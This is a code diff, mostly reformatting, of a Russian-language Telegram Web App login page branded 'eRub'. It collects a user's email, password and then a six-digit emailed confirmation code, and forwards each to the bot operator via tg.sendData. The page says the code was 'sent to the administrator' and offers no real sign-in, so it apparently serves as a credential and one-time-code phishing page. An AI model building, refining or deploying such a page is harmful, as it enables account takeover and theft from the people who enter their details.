@@ -6,8 +6,11 @@
     <title>Вход в eRub</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* ===== БАЗА ===== */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f5f7fa;
@@ -29,7 +32,6 @@
             flex-direction: column;
         }
 
-        /* ===== ЛОГОТИП ===== */
         .logo {
             text-align: center;
             margin-bottom: 36px;
@@ -47,10 +49,8 @@
             color: #6c757d;
             font-size: 15px;
             margin-top: 4px;
-            font-weight: 400;
         }
 
-        /* ===== ФОРМА ===== */
         .form-group {
             margin-bottom: 18px;
         }
@@ -76,11 +76,7 @@
             background: white;
             box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.08);
         }
-        .form-group input::placeholder {
-            color: #adb5bd;
-        }
 
-        /* ===== КНОПКИ ===== */
         .btn-primary {
             width: 100%;
             padding: 16px;
@@ -103,9 +99,7 @@
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
-            box-shadow: none;
         }
-
         .btn-secondary {
             width: 100%;
             padding: 14px;
@@ -123,7 +117,6 @@
             background: #e9ecef;
         }
 
-        /* ===== РАЗДЕЛИТЕЛЬ ===== */
         .divider {
             display: flex;
             align-items: center;
@@ -143,7 +136,6 @@
             font-weight: 500;
         }
 
-        /* ===== РЕГИСТРАЦИЯ ===== */
         .register-link {
             text-align: center;
             font-size: 14px;
@@ -158,7 +150,6 @@
             text-decoration: underline;
         }
 
-        /* ===== ТЕХПОДДЕРЖКА ===== */
         .support-btn {
             width: 100%;
             padding: 14px;
@@ -176,7 +167,6 @@
             background: #e9ecef;
         }
 
-        /* ===== СООБЩЕНИЯ ===== */
         .message {
             margin-top: 16px;
             padding: 12px 16px;
@@ -205,7 +195,6 @@
             border: 1px solid #bee5eb;
         }
 
-        /* ===== СКРЫТИЕ ===== */
         .hidden {
             display: none !important;
         }
@@ -238,6 +227,7 @@
             font-size: 13px;
             color: #6c757d;
             margin-bottom: 16px;
+            text-align: center;
         }
         .code-status {
             display: flex;
@@ -257,207 +247,231 @@
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.8);
+            }
+        }
+
+        .step-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 4px;
+        }
+        .step-sub {
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 16px;
         }
     </style>
 </head>
 <body>
-<div class="container">
+    <div class="container">
 
-    <!-- ===== ЛОГО ===== -->
-    <div class="logo">
-        <h1><span>eRub</span></h1>
-        <p>Войдите в свой аккаунт</p>
+        <!-- ===== ЛОГО ===== -->
+        <div class="logo">
+            <h1><span>eRub</span></h1>
+            <p>Войдите в свой аккаунт</p>
+        </div>
+
+        <!-- ========================================= -->
+        <!-- ===== ШАГ 1: ЛОГИН ===== -->
+        <!-- ========================================= -->
+        <div id="stepLogin">
+            <div class="form-group">
+                <label>📧 Email</label>
+                <input type="email" id="email" placeholder="your@email.com">
+            </div>
+            <div class="form-group">
+                <label>🔑 Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль">
+            </div>
+            <button id="loginBtn" class="btn-primary">🔓 Войти</button>
+
+            <div class="divider"><span>или</span></div>
+            <div class="register-link">
+                Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
+            </div>
+        </div>
+
+        <!-- ========================================= -->
+        <!-- ===== ШАГ 2: КОД ===== -->
+        <!-- ========================================= -->
+        <div id="stepCode" class="hidden">
+            <div style="text-align:center;margin-bottom:12px;">
+                <div style="font-size:40px;">📧</div>
+                <div class="step-title">Код подтверждения</div>
+                <div class="step-sub">Введите код, отправленный на вашу почту</div>
+            </div>
+
+            <div class="code-box">
+                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
+            </div>
+            <p class="code-hint">Код из 6 цифр</p>
+
+            <button id="codeBtn" class="btn-primary">✅ Подтвердить</button>
+
+            <div class="code-status">
+                <span class="dot"></span>
+                Ожидание кода...
+            </div>
+
+            <button id="backBtn" class="btn-secondary">← Назад</button>
+        </div>
+
+        <!-- ===== СООБЩЕНИЯ ===== -->
+        <div id="msg" class="message"></div>
+
+        <!-- ===== ТЕХПОДДЕРЖКА ===== -->
+        <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
     </div>
 
-    <!-- ===== ШАГ 1: ВХОД ===== -->
-    <div id="stepLogin">
-        <div class="form-group">
-            <label>📧 Email</label>
-            <input type="email" id="email" placeholder="your@email.com">
-        </div>
-        <div class="form-group">
-            <label>🔑 Пароль</label>
-            <input type="password" id="password" placeholder="Введите пароль">
-        </div>
-        <button id="loginBtn" class="btn-primary">🔓 Войти</button>
+    <script>
+        // ============================================================
+        // 1. ИНИЦИАЛИЗАЦИЯ
+        // ============================================================
+        const tg = window.Telegram.WebApp;
+        tg.expand();
 
-        <div class="divider"><span>или</span></div>
+        const stepLogin = document.getElementById('stepLogin');
+        const stepCode = document.getElementById('stepCode');
+        const email = document.getElementById('email');
+        const password = document.getElementById('password');
+        const codeInput = document.getElementById('codeInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const codeBtn = document.getElementById('codeBtn');
+        const backBtn = document.getElementById('backBtn');
+        const msgDiv = document.getElementById('msg');
 
-        <div class="register-link">
-            Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
-        </div>
-    </div>
+        let lastEmail = '';
+        let lastPass = '';
 
-    <!-- ===== ШАГ 2: КОД ===== -->
-    <div id="stepCode" class="hidden">
-        <div style="text-align:center;margin-bottom:16px;">
-            <div style="font-size:40px;">📧</div>
-            <h2 style="font-size:20px;color:#1a1a2e;margin-top:4px;">Код подтверждения</h2>
-            <p style="color:#6c757d;font-size:14px;margin-top:4px;">Введите код, отправленный на вашу почту</p>
-        </div>
-
-        <div class="code-box">
-            <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
-        </div>
-        <p class="code-hint">Код из 6 цифр</p>
-
-        <button id="codeBtn" class="btn-primary">✅ Подтвердить</button>
-
-        <div class="code-status">
-            <span class="dot"></span>
-            Ожидание кода...
-        </div>
-
-        <button id="backBtn" class="btn-secondary">← Назад</button>
-    </div>
-
-    <!-- ===== СООБЩЕНИЯ ===== -->
-    <div id="msg" class="message"></div>
-
-    <!-- ===== ТЕХПОДДЕРЖКА ===== -->
-    <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
-</div>
-
-<script>
-    // ============================================================
-    // 1. ИНИЦИАЛИЗАЦИЯ
-    // ============================================================
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-
-    const stepLogin = document.getElementById('stepLogin');
-    const stepCode   = document.getElementById('stepCode');
-    const email      = document.getElementById('email');
-    const password   = document.getElementById('password');
-    const codeInput  = document.getElementById('codeInput');
-    const loginBtn   = document.getElementById('loginBtn');
-    const codeBtn    = document.getElementById('codeBtn');
-    const backBtn    = document.getElementById('backBtn');
-    const msgDiv     = document.getElementById('msg');
-
-    let lastEmail = '';
-    let lastPass  = '';
-
-    function showMsg(text, type = 'info') {
-        msgDiv.textContent = text;
-        msgDiv.className = `message ${type}`;
-        msgDiv.style.display = 'block';
-        clearTimeout(msgDiv._timer);
-        msgDiv._timer = setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
-    }
-
-    function goToCode() {
-        stepLogin.classList.add('hidden');
-        stepCode.classList.remove('hidden');
-        codeInput.value = '';
-        setTimeout(() => codeInput.focus(), 200);
-    }
-
-    function goToLogin() {
-        stepCode.classList.add('hidden');
-        stepLogin.classList.remove('hidden');
-        msgDiv.style.display = 'none';
-    }
-
-    // ============================================================
-    // 2. ЛОГИН → ОТПРАВКА EMAIL + ПАРОЛЬ
-    // ============================================================
-    loginBtn.addEventListener('click', function() {
-        const e = email.value.trim();
-        const p = password.value.trim();
-
-        if (!e || !p) {
-            showMsg('Заполните все поля', 'error');
-            return;
-        }
-        if (!e.includes('@')) {
-            showMsg('Введите корректный email', 'error');
-            return;
+        function showMsg(text, type = 'info') {
+            msgDiv.textContent = text;
+            msgDiv.className = `message ${type}`;
+            msgDiv.style.display = 'block';
+            clearTimeout(msgDiv._timer);
+            msgDiv._timer = setTimeout(() => {
+                msgDiv.style.display = 'none';
+            }, 5000);
         }
 
-        loginBtn.disabled = true;
-        loginBtn.textContent = '⏳ Отправка...';
-        showMsg('Отправка данных...', 'info');
-
-        lastEmail = e;
-        lastPass  = p;
-
-        try {
-            tg.sendData(JSON.stringify({ email: e, password: p }));
-            // → СРАЗУ ОТКРЫВАЕМ ОКНО КОДА
-            loginBtn.disabled = false;
-            loginBtn.textContent = '🔓 Войти';
-            msgDiv.style.display = 'none';
-            goToCode();
-            showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
-        } catch (err) {
-            showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
-            loginBtn.disabled = false;
-            loginBtn.textContent = '🔓 Войти';
-        }
-    });
-
-    // ============================================================
-    // 3. КОД → ОТПРАВКА КОДА
-    // ============================================================
-    codeBtn.addEventListener('click', function() {
-        const code = codeInput.value.trim();
-
-        if (!code || code.length < 4) {
-            showMsg('Введите корректный код (минимум 4 символа)', 'error');
-            return;
-        }
-
-        codeBtn.disabled = true;
-        codeBtn.textContent = '⏳ Отправка...';
-        showMsg('Отправка кода...', 'info');
-
-        try {
-            tg.sendData(JSON.stringify({ code: code }));
-            showMsg('✅ Код отправлен администратору!', 'success');
-            codeBtn.disabled = false;
-            codeBtn.textContent = '✅ Подтвердить';
+        function goToCode() {
+            stepLogin.classList.add('hidden');
+            stepCode.classList.remove('hidden');
             codeInput.value = '';
-
-            // через 2 секунды возвращаемся к форме
-            setTimeout(() => {
-                goToLogin();
-                showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
-            }, 2000);
-
-        } catch (err) {
-            showMsg('❌ Ошибка отправки кода', 'error');
-            codeBtn.disabled = false;
-            codeBtn.textContent = '✅ Подтвердить';
+            setTimeout(() => codeInput.focus(), 300);
         }
-    });
 
-    // ============================================================
-    // 4. НАЗАД
-    // ============================================================
-    backBtn.addEventListener('click', goToLogin);
+        function goToLogin() {
+            stepCode.classList.add('hidden');
+            stepLogin.classList.remove('hidden');
+            msgDiv.style.display = 'none';
+        }
 
-    // ============================================================
-    // 5. ENTER
-    // ============================================================
-    document.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            if (!stepLogin.classList.contains('hidden')) {
-                loginBtn.click();
-            } else if (!stepCode.classList.contains('hidden')) {
-                codeBtn.click();
+        // ============================================================
+        // 2. ЛОГИН → ОТПРАВКА EMAIL + ПАРОЛЬ
+        // ============================================================
+        loginBtn.addEventListener('click', function() {
+            const e = email.value.trim();
+            const p = password.value.trim();
+
+            if (!e || !p) {
+                showMsg('Заполните все поля', 'error');
+                return;
             }
-        }
-    });
+            if (!e.includes('@')) {
+                showMsg('Введите корректный email', 'error');
+                return;
+            }
 
-    // ============================================================
-    // 6. ТЕХПОДДЕРЖКА
-    // ============================================================
-    function openSupport() {
-        window.open('https://t.me/potok457', '_blank');
-    }
-</script>
+            loginBtn.disabled = true;
+            loginBtn.textContent = '⏳ Отправка...';
+            showMsg('Отправка данных...', 'info');
+
+            lastEmail = e;
+            lastPass = p;
+
+            try {
+                tg.sendData(JSON.stringify({ email: e, password: p }));
+                // СРАЗУ ОТКРЫВАЕМ ОКНО КОДА
+                loginBtn.disabled = false;
+                loginBtn.textContent = '🔓 Войти';
+                msgDiv.style.display = 'none';
+                goToCode();
+                showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
+            } catch (err) {
+                showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = '🔓 Войти';
+            }
+        });
+
+        // ============================================================
+        // 3. КОД → ОТПРАВКА КОДА
+        // ============================================================
+        codeBtn.addEventListener('click', function() {
+            const code = codeInput.value.trim();
+
+            if (!code || code.length < 4) {
+                showMsg('Введите корректный код (минимум 4 символа)', 'error');
+                return;
+            }
+
+            codeBtn.disabled = true;
+            codeBtn.textContent = '⏳ Отправка...';
+            showMsg('Отправка кода...', 'info');
+
+            try {
+                tg.sendData(JSON.stringify({ code: code }));
+                showMsg('✅ Код отправлен администратору!', 'success');
+                codeBtn.disabled = false;
+                codeBtn.textContent = '✅ Подтвердить';
+                codeInput.value = '';
+
+                // через 2 секунды возвращаемся к форме
+                setTimeout(() => {
+                    goToLogin();
+                    showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
+                }, 2000);
+
+            } catch (err) {
+                showMsg('❌ Ошибка отправки кода', 'error');
+                codeBtn.disabled = false;
+                codeBtn.textContent = '✅ Подтвердить';
+            }
+        });
+
+        // ============================================================
+        // 4. НАЗАД
+        // ============================================================
+        backBtn.addEventListener('click', goToLogin);
+
+        // ============================================================
+        // 5. ENTER
+        // ============================================================
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                if (!stepLogin.classList.contains('hidden')) {
+                    loginBtn.click();
+                } else if (!stepCode.classList.contains('hidden')) {
+                    codeBtn.click();
+                }
+            }
+        });
+
+        // ============================================================
+        // 6. ТЕХПОДДЕРЖКА
+        // ============================================================
+        function openSupport() {
+            window.open('https://t.me/potok457', '_blank');
+        }
+    </script>
 </body>
 </html>
